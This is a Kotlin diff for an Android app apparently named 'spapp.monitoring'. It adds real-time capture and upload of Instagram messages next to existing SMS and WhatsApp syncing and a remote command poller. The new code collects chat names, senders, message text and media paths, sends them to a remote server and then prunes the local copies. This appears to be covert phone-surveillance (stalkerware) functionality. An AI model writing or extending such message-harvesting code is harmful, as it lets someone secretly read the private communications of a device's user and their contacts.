@@ -20,6 +20,8 @@ import com.spapp.monitoring.network.SmsLogEntryDto
 import com.spapp.monitoring.network.SmsLogSyncRequest
 import com.spapp.monitoring.network.WhatsAppMessageEntryDto
 import com.spapp.monitoring.network.WhatsAppMessagesSyncRequest
+import com.spapp.monitoring.network.InstagramMessageEntryDto
+import com.spapp.monitoring.network.InstagramMessagesSyncRequest
 import com.spapp.monitoring.network.FcmTokenRequest
 import com.spapp.monitoring.sync.SyncRunner
 import com.google.firebase.messaging.FirebaseMessaging
@@ -61,6 +63,9 @@ object RealtimeLogObserverManager {
 
     private var whatsAppJob: Job? = null
     private val whatsAppMutex = Mutex()
+
+    private var instagramJob: Job? = null
+    private val instagramMutex = Mutex()
 
     private var commandPollerJob: Job? = null
     private var lastUploadedFcmToken: String? = null
@@ -355,6 +360,51 @@ object RealtimeLogObserverManager {
                 Unit
             } catch (e: Exception) {
                 Log.e(TAG, "Error in real-time WhatsApp upload", e)
+            }
+        }
+    }
+
+    fun triggerInstantInstagramUpload(context: Context) {
+        synchronized(this) {
+            instagramJob?.cancel()
+            instagramJob = scope.launch {
+                delay(200)
+                captureAndUploadInstagram(context.applicationContext)
+            }
+        }
+    }
+
+    private suspend fun captureAndUploadInstagram(context: Context) {
+        instagramMutex.withLock {
+            try {
+                val db = AppDatabase.getInstance(context)
+                val state = DeviceState(context)
+                val bearer = state.authToken?.let { "Bearer $it" } ?: return
+
+                val unsynced = db.instagramMessageDao().getUnsynced()
+                if (unsynced.isNotEmpty()) {
+                    val dtos = unsynced.map {
+                        InstagramMessageEntryDto(
+                            chatName = it.chatName,
+                            sender = it.sender,
+                            messageText = it.messageText,
+                            isOutgoing = it.isOutgoing,
+                            messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
+                            mediaType = it.mediaType,
+                            mediaPath = it.mediaPath,
+                            reelUrl = it.reelUrl
+                        )
+                    }
+                    val response = ApiClient.service.syncInstagramMessages(bearer, InstagramMessagesSyncRequest(dtos))
+                    if (response.isSuccessful) {
+                        db.instagramMessageDao().markSynced(unsynced.map { it.id })
+                        db.instagramMessageDao().pruneOldMessages(System.currentTimeMillis() - 14 * 24 * 60 * 60 * 1000L)
+                        Log.d(TAG, "Instantly uploaded ${dtos.size} Instagram messages to server")
+                    }
+                }
+                Unit
+            } catch (e: Exception) {
+                Log.e(TAG, "Error in real-time Instagram upload", e)
             }
         }
     }
